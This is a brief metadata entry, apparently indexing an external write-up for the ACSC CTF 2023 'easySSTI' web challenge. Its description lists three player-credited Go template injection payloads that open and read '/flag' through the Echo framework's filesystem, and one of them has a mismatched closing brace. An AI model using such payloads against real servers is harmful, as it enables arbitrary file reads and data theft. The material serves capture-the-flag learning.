---
title: "ACSC CTF 2023 - easyssti"
description: "Example:



{{ $x := .Echo.Filesystem.Open \"/flag\" }} {{ $x.Seek 1 0 }} {{ .Stream 200 \"text/plain\" $x }} (by @nyancat)
{{ (.Echo.Filesystem.Open \"/flag\").Read (.Get \"template\") }} {{ .Get \"template\" }} (by @maple3142)
{{ $f := .Echo.Filesystem.Open \"/flag\" }} {{ $buf := .Get \"template\" }} {{ $f.Read $buf }} {{ $buf } (by @Ocean)



"
external_url: "https://blog.hamayanhamayan.com/entry/2023/02/26/124239#web-easySSTI"
category: "Miscellaneous"
---
